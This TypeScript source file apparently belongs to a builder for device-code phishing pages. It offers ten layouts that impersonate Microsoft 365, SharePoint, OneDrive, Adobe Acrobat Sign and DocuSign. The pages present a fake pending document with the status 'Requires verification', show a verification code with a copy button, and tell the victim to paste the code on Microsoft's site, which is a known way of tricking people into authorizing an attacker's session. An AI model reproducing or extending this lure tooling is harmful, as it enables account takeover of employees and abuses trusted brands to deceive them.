import { defaultProviderLogo, getBuiltinLogo } from "@/lib/logo-library";
import type { BuilderConfiguration, PageDocument, PageNode } from "@/lib/page-document";

export type PreviewState = "initial" | "waiting" | "success" | "expired" | "error" | "ready" | "reviewing" | "completed";
export type PageDesign = { id: BuilderConfiguration["layoutId"]; name: string; description: string; structure: string; accent: string };

export const pageDesigns: PageDesign[] = [
  { id: "compact-card", name: "Compact Verification", description: "A narrow, focused authorization card.", structure: "Centered card", accent: "#2563eb" },
  { id: "split-screen", name: "Split Document Workflow", description: "Document identity rail beside a spacious workflow.", structure: "Document rail + workflow", accent: "#dc2626" },
  { id: "document-view", name: "Document Detail", description: "Large document preview with metadata and authorization.", structure: "Preview + metadata panel", accent: "#d92d20" },
  { id: "centered-enterprise", name: "Organization Branded Access", description: "Company identity leads; provider authorization follows.", structure: "Brand-led enterprise", accent: "#274690" },
  { id: "full-hero", name: "Centered File Access", description: "File title and status flow directly into verification.", structure: "Centered file workflow", accent: "#0f6cbd" },
  { id: "two-column-instructions", name: "Side Instruction Flow", description: "Large numbered guidance beside a compact action panel.", structure: "Instructions + action", accent: "#2563eb" },
  { id: "resource-portal", name: "Resource Workspace", description: "Resource cards drive a workspace-style composition.", structure: "Workspace + authorization", accent: "#03787c" },
  { id: "modern-glass", name: "Document Hero", description: "The resource visual dominates; authorization stays secondary.", structure: "Document hero + floating action", accent: "#7c3aed" },
  { id: "dark-professional", name: "Minimal Verification", description: "Restrained dark composition with exceptional code focus.", structure: "Minimal high contrast", accent: "#22c55e" },
  { id: "mobile-first-stack", name: "Corporate Split", description: "Company, department, and support identity beside authorization.", structure: "Corporate brand + action", accent: "#0f766e" },
];

export const providerProfiles: Record<BuilderConfiguration["provider"], { name: string; nodeProvider: NonNullable<PageNode["provider"]>; title: string; description: string; color: string }> = {
  microsoft365: { name: "Microsoft 365", nodeProvider: "microsoft365", title: "Connect your work account", description: "Use Microsoft’s official authorization page to continue securely.", color: "#2563eb" },
  sharepoint: { name: "SharePoint", nodeProvider: "sharepoint", title: "Open your company workspace", description: "Verify your work account to access approved SharePoint resources.", color: "#03787c" },
  onedrive: { name: "OneDrive", nodeProvider: "onedrive", title: "Access shared company files", description: "Verify your work account before opening approved shared files.", color: "#0078d4" },
  adobe: { name: "Adobe Acrobat Sign", nodeProvider: "adobe", title: "Review your secure document", description: "Verify your work account before continuing to the official document workflow.", color: "#d92d20" },
  docusign: { name: "DocuSign", nodeProvider: "docusign", title: "A document is ready for review", description: "Verify your work account before continuing to the official signing workflow.", color: "#4c00ff" },
  company: { name: "Company", nodeProvider: "company", title: "Access company resources", description: "Verify your approved work account to continue.", color: "#3158d4" },
  custom: { name: "Custom", nodeProvider: "company", title: "Complete secure authorization", description: "Verify your approved work account to continue.", color: "#3158d4" },
};

export function defaultBuilderConfiguration(layoutId: BuilderConfiguration["layoutId"] = "compact-card", provider: BuilderConfiguration["provider"] = "microsoft365"): BuilderConfiguration {
  const profile = providerProfiles[provider];
  const dark = layoutId === "dark-professional";
  return {
    layoutId, provider,
    title: profile.title,
    description: profile.description,
    steps: ["Copy the verification code above.", "Continue to Microsoft and paste the code.", "Complete Microsoft authentication."],
    continueButtonText: "Continue to Microsoft",
    footer: "Authentication is completed securely on Microsoft’s website.",
    successMessage: "Your Microsoft account was successfully connected.",
    redirectText: "Redirecting to",
    primaryColor: pageDesigns.find((design) => design.id === layoutId)?.accent ?? profile.color,
    background: dark ? "#08131f" : "#f5f6f8",
    documentName: "Project Documents.pdf",
    documentTitle: "Project documents",
    fileType: "PDF document",
    pageCount: "12 pages",
    fileSize: "2.4 MB",
    sender: "Operations Team",
    companyName: "Your Company",
    department: "Employee Operations",
    documentStatus: "Requires verification",
    logoMode: "provider",
    logoSize: "medium",
    logoAlignment: layoutId === "compact-card" || layoutId === "full-hero" ? "center" : "left",
    logoSpacing: 16,
    logoWidth: 168,
    logoMaxHeight: 48,
    logoBackground: "none",
    showProviderName: true,
    providerLogoId: defaultProviderLogo(provider, dark),
    companyBuiltinLogoId: "company-portal",
    redirectDelay: "3",
  };
}

export function buildPageDesign(config: BuilderConfiguration, state: PreviewState = "waiting"): PageDocument {
  const defaults = defaultBuilderConfiguration(config.layoutId, config.provider);
  const c = { ...defaults, ...config };
  const dark = c.layoutId === "dark-professional";
  const page: PageDocument = {
    schemaVersion: 1,
    settings: {
      title: c.title, seoTitle: c.title, description: c.description,
      background: dark ? "#08131f" : c.background,
      fontFamily: "Geist, Inter, system-ui, sans-serif",
      color: dark ? "#f8fafc" : "#172033",
      maxWidth: "1100px", visibility: "public", builder: c,
    },
    nodes: [],
  };
  const auth = authorization(c, state, dark);
  switch (c.layoutId) {
    case "compact-card":
      page.settings.maxWidth = "480px";
      page.nodes = [section("compact-stage", [card("compact-card", [
        brand(c, "center"), text("compact-kicker", c.documentTitle!, centerMuted()),
        heading("compact-title", c.title, { textAlign: "center", fontSize: "28px" }),
        text("compact-description", c.description, { textAlign: "center", color: "#667085", fontSize: "14px" }),
        ...auth,
      ], { maxWidth: "480px", margin: "0 auto", padding: "28px", borderRadius: "14px", boxShadow: "0 18px 50px #17203312" })], { minHeight: "100vh", padding: "32px 16px", background: "#f6f7f9" })];
      break;
    case "split-screen":
      page.nodes = [columns("split-document", [
        section("split-rail", [brand(c, "left"), documentTile(c, "split-file"), text("split-sender", `${c.sender}\n${c.companyName}`, { color: "#667085", fontSize: "12px", margin: "auto 0 0" })], { minHeight: "100vh", padding: "30px", background: softTint(c.primaryColor), alignItems: "stretch" }),
        section("split-workflow", [n("split-inner", "section", "Workflow", { style: { maxWidth: "560px", margin: "auto", padding: "24px 0" }, children: [heading("split-title", c.title, { fontSize: "28px" }), text("split-description", c.description, { color: "#667085" }), ...auth] })], { minHeight: "100vh", padding: "32px", background: "#fff" }),
      ], { gridTemplateColumns: "40% 60%", gap: "0", minHeight: "100vh" })];
      break;
    case "document-view":
      page.nodes = [section("detail-stage", [columns("detail-columns", [
        n("detail-preview", "section", "Document preview", { style: { minHeight: "640px", padding: "28px", background: "#eef0f3", borderRadius: "12px" }, children: [documentSheet(c)] }),
        n("detail-panel", "section", "Document details", { style: { padding: "8px 0" }, children: [brand(c, "left"), heading("detail-name", c.documentName, { fontSize: "24px" }), metadata(c), divider("detail-divider"), heading("detail-title", c.title, { fontSize: "25px" }), text("detail-description", c.description, { color: "#667085" }), ...auth] }),
      ], { gridTemplateColumns: "1.25fr .75fr", gap: "32px", alignItems: "start" })], { minHeight: "100vh", padding: "28px", background: "#f7f8fa" })];
      break;
    case "centered-enterprise":
      page.nodes = [section("organization-stage", [
        n("organization-brand", "section", "Organization identity", { style: { maxWidth: "760px", margin: "0 auto 24px", textAlign: "center", padding: "12px" }, children: [companyBrand(c, "center"), text("organization-department", c.department!, { color: c.primaryColor, fontSize: "12px", fontWeight: "650", textAlign: "center", letterSpacing: ".08em" }), heading("organization-title", c.title, { textAlign: "center", fontSize: "30px" }), text("organization-description", c.description, { textAlign: "center", color: "#667085", fontSize: "15px" })] }),
        card("organization-auth", [providerBrand(c, "center"), ...auth], { maxWidth: "520px", margin: "0 auto", padding: "26px" }),
      ], { minHeight: "100vh", padding: "38px 20px", background: "#f6f7f9" })];
      break;
    case "full-hero":
      page.settings.maxWidth = "560px";
      page.nodes = [section("file-stage", [n("file-flow", "section", "File access", { style: { maxWidth: "560px", margin: "0 auto", textAlign: "center", padding: "20px" }, children: [
        brand(c, "center"), fileGlyph("file-icon", c.primaryColor), heading("file-name", c.documentName, { textAlign: "center", fontSize: "25px" }), metadata(c, true),
        text("file-description", c.description, { textAlign: "center", color: "#667085" }), ...auth,
      ] })], { minHeight: "100vh", padding: "28px 16px", background: "#fff" })];
      break;
    case "two-column-instructions":
      page.nodes = [section("instruction-stage", [columns("instruction-columns", [
        n("instruction-copy", "section", "Instructions", { style: { padding: "28px" }, children: [companyBrand(c, "left"), text("instruction-kicker", "Secure access in three steps", { color: c.primaryColor, fontSize: "12px", fontWeight: "650" }), heading("instruction-title", c.title, { fontSize: "30px" }), text("instruction-description", c.description, { color: "#667085" }), steps("instruction-large", c.steps, { margin: "24px 0", fontSize: "16px", gap: "18px" })] }),
        card("instruction-action", [providerBrand(c, "center"), ...auth.filter((node) => node.id !== "auth-steps")], { padding: "26px", margin: "auto 0" }),
      ], { gridTemplateColumns: "1.1fr .9fr", gap: "42px", alignItems: "center" })], { minHeight: "100vh", padding: "36px 5vw", background: "#f7f8fa" })];
      break;
    case "resource-portal":
      page.nodes = [header("workspace-header", brandPair(c), { background: "#fff", padding: "16px 28px" }), section("workspace-main", [
        heading("workspace-title", c.documentTitle!, { fontSize: "28px" }), text("workspace-subtitle", c.description, { color: "#667085" }),
        columns("workspace-layout", [
          n("workspace-resources", "section", "Resources", { children: [
            columns("resource-grid", [resource("resource-project", "Project files", "sharepoint", "Approved team documents"), resource("resource-shared", "Shared files", "onedrive", "Files shared with your account"), resource("resource-document", c.documentName, "document", c.documentStatus!)], { gridTemplateColumns: "repeat(2,1fr)", gap: "12px" }),
          ] }),
          card("workspace-auth", [heading("workspace-auth-title", c.title, { fontSize: "23px" }), ...auth], { padding: "22px" }),
        ], { gridTemplateColumns: "1.2fr .8fr", gap: "26px", alignItems: "start" }),
      ], { minHeight: "calc(100vh - 68px)", padding: "28px", background: "#f5f7f8" })];
      break;
    case "modern-glass":
      page.nodes = [section("hero-stage", [
        n("document-hero", "section", "Document hero", { style: { minHeight: "520px", maxWidth: "1050px", margin: "0 auto", padding: "38px", borderRadius: "18px", background: `linear-gradient(145deg,${softTint(c.primaryColor)},#ffffff)`, boxShadow: "0 22px 70px #17203314" }, children: [...brandPair(c), columns("hero-content", [
          n("hero-document", "section", "Document focus", { style: { padding: "24px 0" }, children: [fileGlyph("hero-file", c.primaryColor), heading("hero-document-name", c.documentName, { fontSize: "34px" }), metadata(c), text("hero-description", c.description, { color: "#667085", maxWidth: "540px" })] }),
          card("hero-action", [heading("hero-title", c.title, { fontSize: "23px" }), ...auth], { padding: "22px", margin: "40px 0 0" }),
        ], { gridTemplateColumns: "1.2fr .8fr", gap: "30px", alignItems: "center" })] }),
      ], { minHeight: "100vh", padding: "32px 22px", background: "#f4f5f7" })];
      break;
    case "dark-professional":
      page.settings.maxWidth = "460px";
      page.nodes = [section("minimal-stage", [n("minimal-flow", "section", "Minimal verification", { style: { maxWidth: "460px", margin: "0 auto", padding: "24px", textAlign: "center" }, children: [
        brand(c, "center", true), heading("minimal-title", c.title, { textAlign: "center", fontSize: "27px", color: "#f8fafc" }), text("minimal-description", c.description, { textAlign: "center", color: "#aebdca", fontSize: "14px" }), ...auth,
      ] })], { minHeight: "100vh", padding: "40px 16px", background: "#08131f" })];
      break;
    case "mobile-first-stack":
      page.nodes = [columns("corporate-split", [
        section("corporate-brand", [companyBrand(c, "left", true), text("corporate-department", c.department!, { color: "#9fb2c2", fontSize: "13px" }), heading("corporate-heading", "Secure company access", { color: "#fff", fontSize: "34px", margin: "34px 0 12px" }), text("corporate-company", `${c.companyName}\n${c.sender}\nsupport@company.example`, { color: "#b8c7d4", fontSize: "14px", margin: "auto 0 0" })], { minHeight: "100vh", padding: "42px", background: "#102333" }),
        section("corporate-action-area", [card("corporate-auth", [providerBrand(c, "left"), heading("corporate-title", c.title, { fontSize: "27px" }), text("corporate-description", c.description, { color: "#667085" }), ...auth], { maxWidth: "520px", margin: "auto", padding: "28px" })], { minHeight: "100vh", padding: "36px", background: "#f6f7f9" }),
      ], { gridTemplateColumns: "42% 58%", gap: "0", minHeight: "100vh" })];
      break;
  }
  return page;
}

function authorization(c: BuilderConfiguration, state: PreviewState, dark: boolean): PageNode[] {
  const muted = dark ? "#aebdca" : "#667085";
  const terminal = ["expired", "error"].includes(state);
  return [
    n("auth-active", "section", "Authorization", { visibleWhen: ["initial", "waiting", "ready", "reviewing", "expired", "error"], children: [
      n("auth-code", "deviceCode", "Verification code", { content: "Your verification code", style: { margin: "16px 0 10px", background: dark ? "#0d2030" : undefined, border: dark ? "1px solid #294456" : undefined } }),
      button("auth-copy", "Copy Code", "copy-device-code", { width: "100%", padding: "11px", background: "transparent", color: dark ? "#fff" : c.primaryColor, border: dark ? "1px solid #365368" : `1px solid ${softBorder(c.primaryColor)}`, borderRadius: "9px" }),
      steps("auth-steps", c.steps, { margin: "16px 0", color: muted }),
      button("auth-continue", c.continueButtonText, "open-microsoft", { width: "100%", padding: "14px", background: c.primaryColor, color: readable(c.primaryColor), borderRadius: "9px" }),
    ] }),
    n("auth-success", "section", "Success", { visibleWhen: ["success", "completed", "connected", "authorized"], style: { padding: "20px 0", textAlign: "center" }, children: [
      text("success-check", "✓", { textAlign: "center", color: "#15906f", fontSize: "32px", margin: "0 0 8px" }),
      heading("success-title", "Authorization Complete", { textAlign: "center", fontSize: "25px" }),
      text("success-message", c.successMessage!, { textAlign: "center", color: muted }),
      text("success-redirect", c.redirectUrl ? `${c.redirectText}: ${safeHost(c.redirectUrl)}` : "No redirect configured", { textAlign: "center", color: muted, fontSize: "12px" }),
    ] }),
    n("auth-error-message", "callout", "Terminal state", { visibleWhen: ["expired", "error", "failed", "cancelled"], content: terminal ? "Authorization could not be completed. You can restart safely." : "", style: { padding: "10px", background: dark ? "#32171b" : "#fff1f0", border: "0", color: dark ? "#fecaca" : "#b42318", boxShadow: "none", margin: "12px 0" } }),
    n("auth-status", "status", "Authorization status", { content: stateLabel(state), statusKind: state === "success" ? "success" : state === "expired" ? "expired" : state === "error" ? "failed" : "waiting", style: { margin: "14px 0 0", color: muted } }),
    button("auth-restart", "Restart authorization", "restart-authorization", { width: "100%", padding: "9px", background: "transparent", color: muted, border: "0" }),
    text("auth-footer", c.footer, { margin: "14px 0 0", textAlign: "center", fontSize: "11px", color: muted }),
  ];
}

function brand(c: BuilderConfiguration, alignment: "left" | "center" | "right", forceLight = false) {
  return n(`brand-${alignment}`, "section", "Brand identity", { style: { padding: "0", margin: `0 0 ${c.logoSpacing}px`, textAlign: alignment }, children: logoNodes(c, alignment, forceLight) });
}
function brandPair(c: BuilderConfiguration) {
  const nodes = logoNodes(c, "left");
  return nodes.length > 1 ? nodes : [brand(c, "left")];
}
function providerBrand(c: BuilderConfiguration, alignment: "left" | "center" | "right") {
  const logo = providerLogo(c, alignment);
  return n("provider-brand", "section", "Provider identity", { style: { padding: "0", margin: `0 0 ${c.logoSpacing}px`, textAlign: alignment }, children: logo ? [logo] : [] });
}
function companyBrand(c: BuilderConfiguration, alignment: "left" | "center" | "right", light = false) {
  const logo = companyLogo(c, alignment, light);
  return n("company-brand", "section", "Company identity", { style: { padding: "0", margin: `0 0 ${c.logoSpacing}px`, textAlign: alignment }, children: logo ? [logo] : [] });
}
function logoNodes(c: BuilderConfiguration, alignment: "left" | "center" | "right", forceLight = false) {
  const nodes: PageNode[] = [];
  if (c.logoMode === "company" || c.logoMode === "both") { const logo = companyLogo(c, alignment, forceLight); if (logo) nodes.push(logo); }
  if (c.logoMode === "provider" || c.logoMode === "both") { const logo = providerLogo(c, alignment, forceLight); if (logo) nodes.push(logo); }
  return nodes;
}
function providerLogo(c: BuilderConfiguration, alignment: "left" | "center" | "right", forceLight = false) {
  if (c.logoMode === "company" || c.logoMode === "none") return null;
  const selected = getBuiltinLogo(forceLight ? defaultProviderLogo(c.provider, true) : c.providerLogoId) ?? getBuiltinLogo(defaultProviderLogo(c.provider, forceLight));
  return n("provider-logo", "providerLogo", "Provider logo", { provider: providerProfiles[c.provider].nodeProvider, src: selected?.src, alt: selected?.name, content: c.showProviderName ? (c.customProviderName || providerProfiles[c.provider].name) : undefined, style: logoStyle(c, alignment) });
}
function companyLogo(c: BuilderConfiguration, alignment: "left" | "center" | "right", light = false) {
  if (c.logoMode === "provider" || c.logoMode === "none") return null;
  if (c.companyLogoAssetId) return n("company-logo", "logo", "Company logo", { assetId: c.companyLogoAssetId, alt: c.companyName || "Company logo", style: logoStyle(c, alignment) });
  const selected = getBuiltinLogo(c.companyBuiltinLogoId) ?? getBuiltinLogo(light ? "company-portal" : "company-portal");
  return n("company-logo", "providerLogo", "Company logo", { src: selected?.src, alt: "Company logo", content: c.companyName, style: logoStyle(c, alignment) });
}
function logoStyle(c: BuilderConfiguration, alignment: "left" | "center" | "right"): PageNode["style"] {
  const width = c.logoWidth ?? (c.logoSize === "small" ? 120 : c.logoSize === "large" ? 220 : 168);
  return { width: `${width}px`, minHeight: `${c.logoMaxHeight ?? 48}px`, padding: c.logoBackground === "white" || c.logoBackground === "dark" ? "7px 10px" : "0", background: c.logoBackground === "white" ? "#fff" : c.logoBackground === "dark" ? "#102333" : "transparent", borderRadius: "8px", margin: alignment === "center" ? "0 auto" : alignment === "right" ? "0 0 0 auto" : "0" };
}
function documentTile(c: BuilderConfiguration, id: string) { return card(id, [fileGlyph(`${id}-icon`, c.primaryColor), heading(`${id}-name`, c.documentName, { fontSize: "16px", textAlign: "center" }), text(`${id}-meta`, `${c.fileType}\n${c.documentStatus}`, centerMuted())], { maxWidth: "250px", margin: "18px auto", padding: "22px", textAlign: "center", boxShadow: "0 10px 28px #1720330d" }); }
function documentSheet(c: BuilderConfiguration) { return n("document-sheet", "section", "Document sheet", { style: { maxWidth: "430px", minHeight: "570px", margin: "0 auto", padding: "48px 38px", background: "#fff", boxShadow: "0 12px 38px #17203316", textAlign: "center" }, children: [fileGlyph("sheet-icon", c.primaryColor), heading("sheet-title", c.documentTitle!, { fontSize: "24px", textAlign: "center", margin: "24px 0 10px" }), text("sheet-name", c.documentName, { textAlign: "center", color: "#344054" }), divider("sheet-rule"), text("sheet-copy", "This document is available to approved recipients after secure verification.", { textAlign: "left", color: "#667085", fontSize: "13px" })] }); }
function metadata(c: BuilderConfiguration, centered = false) { return text(`metadata-${centered ? "center" : "left"}`, `${c.fileType} · ${c.pageCount} · ${c.fileSize}\n${c.documentStatus}`, { color: "#667085", fontSize: "12px", textAlign: centered ? "center" : "left", lineHeight: "1.6" }); }
function fileGlyph(id: string, color: string) { return n(id, "callout", "File icon", { content: "▤", style: { width: "54px", minHeight: "62px", margin: "0 auto 14px", padding: "14px", background: softTint(color), color, border: "0", borderRadius: "10px", boxShadow: "none", textAlign: "center", fontSize: "24px" } }); }
function n(id: string, type: PageNode["type"], name: string, extra: Partial<PageNode> = {}): PageNode { return { id, type, name, ...extra }; }
function section(id: string, children: PageNode[], style: PageNode["style"] = {}) { return n(id, "section", "Section", { children, style }); }
function card(id: string, children: PageNode[], style: PageNode["style"] = {}) { return n(id, "card", "Card", { children, style }); }
function columns(id: string, children: PageNode[], style: PageNode["style"] = {}) { return n(id, "columns", "Columns", { children, style }); }
function header(id: string, children: PageNode[], style: PageNode["style"] = {}) { return n(id, "header", "Header", { children, style }); }
function heading(id: string, content: string, style: PageNode["style"] = {}) { return n(id, "heading", "Heading", { content, style }); }
function text(id: string, content: string, style: PageNode["style"] = {}) { return n(id, "text", "Text", { content, style }); }
function divider(id: string) { return n(id, "divider", "Divider"); }
function steps(id: string, items: BuilderConfiguration["steps"], style: PageNode["style"] = {}) { return n(id, "steps", "Instructions", { items, style }); }
function button(id: string, content: string, action: PageNode["action"], style: PageNode["style"] = {}) { return n(id, "button", "Button", { content, action, style }); }
function resource(id: string, name: string, provider: NonNullable<PageNode["provider"]>, content: string) { return n(id, "resourceCard", name, { provider, content }); }
function centerMuted(): PageNode["style"] { return { textAlign: "center", color: "#667085", fontSize: "12px" }; }
function softTint(color: string) { return `color-mix(in srgb,${color} 8%,#ffffff)`; }
function softBorder(color: string) { return `color-mix(in srgb,${color} 24%,#e4e7ec)`; }
function readable(color: string) { const value = Number.parseInt(color.slice(1), 16); return (((value >> 16) * 299 + ((value >> 8) & 255) * 587 + (value & 255) * 114) / 1000) > 160 ? "#172033" : "#ffffff"; }
function safeHost(value: string) { try { return new URL(value).hostname; } catch { return value; } }
function stateLabel(state: PreviewState) { return ({ initial: "Ready to begin", waiting: "Waiting for authorization", success: "Authorization complete", expired: "Authorization expired", error: "Authorization failed", ready: "Ready for review", reviewing: "Reviewing document", completed: "Completed" } as Record<PreviewState, string>)[state]; }
